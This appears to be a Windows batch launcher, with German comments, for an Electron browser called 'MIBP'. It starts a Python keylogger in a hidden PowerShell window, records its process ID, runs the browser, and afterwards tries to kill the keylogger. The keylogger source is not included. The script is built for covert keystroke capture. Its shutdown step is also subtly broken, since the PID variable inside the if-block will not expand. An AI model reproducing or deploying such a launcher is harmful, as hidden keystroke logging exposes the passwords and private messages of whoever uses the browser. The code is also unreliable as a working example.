@echo off
title MIBP Browser Start (Robust)
echo [🟢] Starte MIBP-Browser mit Keylogger...

REM Wechsle in das Skriptverzeichnis
cd /d "%~dp0"

REM Starte den Keylogger unsichtbar mit PowerShell (keine extra CMD-Konsole sichtbar)
powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'keylogger.py' -WindowStyle Minimized"

echo [⏳] Warte auf Keylogger...

REM Warte 2 Sekunden, damit der Prozess startet
timeout /t 2 >nul

REM Suche nach dem Prozess "python.exe" (wir verwenden keinen Fenstertitel mehr)
REM Alternativ: Suche nach Keylogger über Titel, falls möglich
for /f "tokens=2" %%i in ('tasklist /FI "IMAGENAME eq python.exe" /V ^| findstr /I "keylogger.py"') do (
    echo %%i > keylogger_pid.txt
    echo [✅] Keylogger gestartet mit PID %%i
    goto :continue
)

:continue
REM Starte den Electron-Browser (sichtbar)
.\node_modules\.bin\electron .

REM Electron wurde geschlossen, beende Keylogger falls PID vorhanden
if exist keylogger_pid.txt (
    set /p PID=<keylogger_pid.txt
    echo [🔒] Beende Keylogger mit PID %PID% ...
    taskkill /PID %PID% /F >nul 2>&1
    del keylogger_pid.txt
    echo [✅] Keylogger erfolgreich beendet.
) else (
    echo [⚠️] Keine PID gefunden – Keylogger konnte nicht beendet werden.
)

exit








